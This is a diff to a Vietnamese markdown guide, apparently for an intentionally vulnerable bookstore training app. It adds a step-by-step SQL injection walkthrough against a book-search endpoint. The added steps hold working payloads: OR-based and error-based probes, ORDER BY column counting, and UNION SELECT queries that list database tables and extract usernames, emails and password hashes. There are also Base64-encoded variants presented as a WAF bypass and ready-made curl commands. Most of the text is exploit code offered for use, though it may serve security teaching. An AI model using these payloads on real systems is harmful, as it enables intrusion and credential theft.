@@ -33,18 +33,168 @@ Nếu bạn host ứng dụng qua **Cloudflare Quick Tunnel** (trycloudflare.com
 ### Mô tả
 Endpoint tìm kiếm sách `/api/books/search` sử dụng `Statement.executeQuery()` với chuỗi SQL được nối trực tiếp từ input người dùng, **không dùng `PreparedStatement`**.
 
-### Hướng dẫn khai thác (Bypass WAF bằng Base64)
-Sử dụng tham số `b64q` thay cho `q`. Chuỗi bên trong `b64q` phải được mã hóa dạng **Base64**.
+**Cấu trúc SQL gốc bên trong server:**
+```sql
+SELECT id, title, author, isbn, price, description, category, stock_quantity, image_url
+FROM books
+WHERE status = 'active' AND (title ILIKE '%<INPUT>%' OR author ILIKE '%<INPUT>%')
+ORDER BY created_at DESC LIMIT 20
+```
 
-**Bước 1 - Trả về tất cả sách (Bypass Login/Filter):**
-- Payload gốc: `test' OR '1'='1`
-- Base64 Encode: `dGVzdCcgT1IgJzEnPScx`
-- Request: `GET /api/books/search?b64q=dGVzdCcgT1IgJzEnPScx`
+### Hướng dẫn khai thác chi tiết (Step-by-step)
 
-**Bước 2 - UNION-based (lấy thông tin users):**
-- Payload gốc: `test' UNION SELECT 1,username,email,password_hash,'cat',null,null,0,null,null,null,'active',0,null,0,0,0,0 FROM users--`
-- Base64 Encode: `dGVzdCcgVU5JT04gU0VMRUNUIDEsdXNlcm5hbWUsZW1haWwscGFzc3dvcmRfaGFzaCwnY2F0JyxudWxsLG51bGwsMCxudWxsLG51bGwsbnVsbCwnYWN0aXZlJywwLG51bGwsMCwwLDAsMCBGUk9NIHVzZXJzLS0=`
-- Request: `GET /api/books/search?b64q=dGVzdCcgVU5JT04gU0VMRUNUIDEsdXNlcm5hbWUsZW1haWwscGFzc3dvcmRfaGFzaCwnY2F0JyxudWxsLG51bGwsMCxudWxsLG51bGwsbnVsbCwnYWN0aXZlJywwLG51bGwsMCwwLDAsMCBGUk9NIHVzZXJzLS0=`
+---
+
+#### 🔹 Bước 1: Tìm kiếm bình thường (xác nhận endpoint hoạt động)
+```
+GET http://localhost:8081/api/books/search?q=test
+```
+→ Trả về bảng HTML hiển thị kết quả tìm kiếm sách chứa từ "test".
+
+---
+
+#### 🔹 Bước 2: OR-based Injection (Trả về TẤT CẢ sách)
+
+**Payload gốc:**
+```
+test%') OR '1'='1') -- 
+```
+
+**Giải thích từng phần:**
+- `test%'` → đóng dấu `%'` của `ILIKE '%test`
+- `)` → đóng ngoặc `(` của `AND (`
+- `OR '1'='1'` → điều kiện luôn đúng
+- `)` → đóng ngoặc ngoài nếu cần
+- `--` → comment bỏ phần SQL còn lại
+
+**URL (dùng trực tiếp trên trình duyệt):**
+```
+http://localhost:8081/api/books/search?q=test%25') OR '1'='1') -- 
+```
+
+**Base64 Bypass WAF:**
+- Payload gốc: `test%') OR '1'='1') -- `
+- Base64: `dGVzdCUnKSBPUiAnMSc9JzEnKSAtLSA=`
+- URL:
+```
+http://localhost:8081/api/books/search?b64q=dGVzdCUnKSBPUiAnMSc9JzEnKSAtLSA=
+```
+
+**Kết quả kỳ vọng:** Trả về 900+ kết quả (toàn bộ sách trong database).
+
+---
+
+#### 🔹 Bước 3: Error-based Injection (Xác nhận lỗ hổng)
+
+**Gửi payload sai cú pháp để xem lỗi SQL chi tiết:**
+```
+http://localhost:8081/api/books/search?q=test'
+```
+
+**Kết quả:** Server trả về thông báo lỗi SQL chi tiết (Information Disclosure), ví dụ:
+```
+Lỗi truy vấn: ERROR: unterminated quoted string at or near ...
+```
+
+---
+
+#### 🔹 Bước 4: ORDER BY Injection (Đếm số cột)
+
+Dùng ORDER BY để xác định số cột của query gốc:
+```
+http://localhost:8081/api/books/search?q=test%25') ORDER BY 9 -- 
+```
+→ Thành công (query có 9 cột)
+
+```
+http://localhost:8081/api/books/search?q=test%25') ORDER BY 10 -- 
+```
+→ Lỗi (chỉ có 9 cột) → Xác nhận query có **9 cột**.
+
+---
+
+#### 🔹 Bước 5: UNION SELECT - Liệt kê tất cả bảng trong DB
+
+**Payload gốc:**
+```
+test%') AND 1=0 UNION SELECT 1,table_name,table_schema,'x',0.0,'x','x',0,'x' FROM information_schema.tables WHERE table_schema='public' -- 
+```
+
+**URL trình duyệt:**
+```
+http://localhost:8081/api/books/search?q=test%25') AND 1=0 UNION SELECT 1,table_name,table_schema,'x',0.0,'x','x',0,'x' FROM information_schema.tables WHERE table_schema='public' -- 
+```
+
+**Base64 Bypass WAF:**
+- Base64: `dGVzdCUnKSBBTkQgMT0wIFVOSU9OIFNFTEVDVCAxLHRhYmxlX25hbWUsdGFibGVfc2NoZW1hLCd4JywwLjAsJ3gnLCd4JywwLCd4JyBGUk9NIGluZm9ybWF0aW9uX3NjaGVtYS50YWJsZXMgV0hFUkUgdGFibGVfc2NoZW1hPSdwdWJsaWMnIC0tIA==`
+- URL:
+```
+http://localhost:8081/api/books/search?b64q=dGVzdCUnKSBBTkQgMT0wIFVOSU9OIFNFTEVDVCAxLHRhYmxlX25hbWUsdGFibGVfc2NoZW1hLCd4JywwLjAsJ3gnLCd4JywwLCd4JyBGUk9NIGluZm9ybWF0aW9uX3NjaGVtYS50YWJsZXMgV0hFUkUgdGFibGVfc2NoZW1hPSdwdWJsaWMnIC0tIA==
+```
+
+**Kết quả:** Trả về danh sách TẤT CẢ bảng trong database (users, orders, books, ...).
+
+---
+
+#### 🔹 Bước 6: UNION SELECT - Xem cấu trúc bảng users
+
+**Payload gốc:**
+```
+test%') AND 1=0 UNION SELECT 1,column_name,data_type,'x',0.0,'x','x',0,'x' FROM information_schema.columns WHERE table_name='users' -- 
+```
+
+**URL trình duyệt:**
+```
+http://localhost:8081/api/books/search?q=test%25') AND 1=0 UNION SELECT 1,column_name,data_type,'x',0.0,'x','x',0,'x' FROM information_schema.columns WHERE table_name='users' -- 
+```
+
+**Kết quả:** Trả về cấu trúc bảng `users` gồm các cột: id, username, email, password_hash, role, ...
+
+---
+
+#### 🔹 Bước 7: UNION SELECT - Trích xuất DỮ LIỆU USERS (username + email + password hash) ⚠️
+
+**Payload gốc:**
+```
+test%') AND 1=0 UNION SELECT 1,username,email,password_hash,0.0,role::text,'n/a',0,'n/a' FROM users -- 
+```
+
+**URL trình duyệt (copy-paste):**
+```
+http://localhost:8081/api/books/search?q=test%25') AND 1=0 UNION SELECT 1,username,email,password_hash,0.0,role::text,'n/a',0,'n/a' FROM users -- 
+```
+
+**Base64 Bypass WAF:**
+- Base64: `dGVzdCUnKSBBTkQgMT0wIFVOSU9OIFNFTEVDVCAxLHVzZXJuYW1lLGVtYWlsLHBhc3N3b3JkX2hhc2gsMC4wLHJvbGU6OnRleHQsJ24vYScsMCwnbi9hJyBGUk9NIHVzZXJzIC0tIA==`
+- URL:
+```
+http://localhost:8081/api/books/search?b64q=dGVzdCUnKSBBTkQgMT0wIFVOSU9OIFNFTEVDVCAxLHVzZXJuYW1lLGVtYWlsLHBhc3N3b3JkX2hhc2gsMC4wLHJvbGU6OnRleHQsJ24vYScsMCwnbi9hJyBGUk9NIHVzZXJzIC0tIA==
+```
+
+**Kết quả:** Trả về bảng HTML chứa TOÀN BỘ thông tin user trong DB:
+
+| title (username) | author (email) | isbn (password_hash) | description (role) |
+|---|---|---|---|
+| admin01 | admin01@gmail.com | $2a$10$E5JF... | admin |
+| seller10 | seller10@gmail.com | $2a$10$5v2I... | seller |
+| ... | ... | ... | ... |
+
+> **⚠️ Lưu ý:** Cột `title` hiển thị `username`, cột `author` hiển thị `email`, cột `isbn` hiển thị `password_hash`, cột `description` hiển thị `role` — vì UNION SELECT map theo thứ tự cột, không theo tên.
+
+---
+
+#### 🔹 Bước 8 (Nâng cao): Dùng cURL
+
+```bash
+# OR-based: Trả về tất cả sách
+curl "http://localhost:8081/api/books/search?q=test%25%27)%20OR%20%271%27%3D%271%27)%20--%20"
+
+# UNION: Lấy thông tin users
+curl "http://localhost:8081/api/books/search?q=test%25%27)%20AND%201%3D0%20UNION%20SELECT%201%2Cusername%2Cemail%2Cpassword_hash%2C0.0%2Crole%3A%3Atext%2C%27n%2Fa%27%2C0%2C%27n%2Fa%27%20FROM%20users%20--%20"
+
+# Base64 bypass: Lấy thông tin users
+curl "http://localhost:8081/api/books/search?b64q=dGVzdCUnKSBBTkQgMT0wIFVOSU9OIFNFTEVDVCAxLHVzZXJuYW1lLGVtYWlsLHBhc3N3b3JkX2hhc2gsMC4wLHJvbGU6OnRleHQsJ24vYScsMCwnbi9hJyBGUk9NIHVzZXJzIC0tIA=="
+```
 
 ---
 
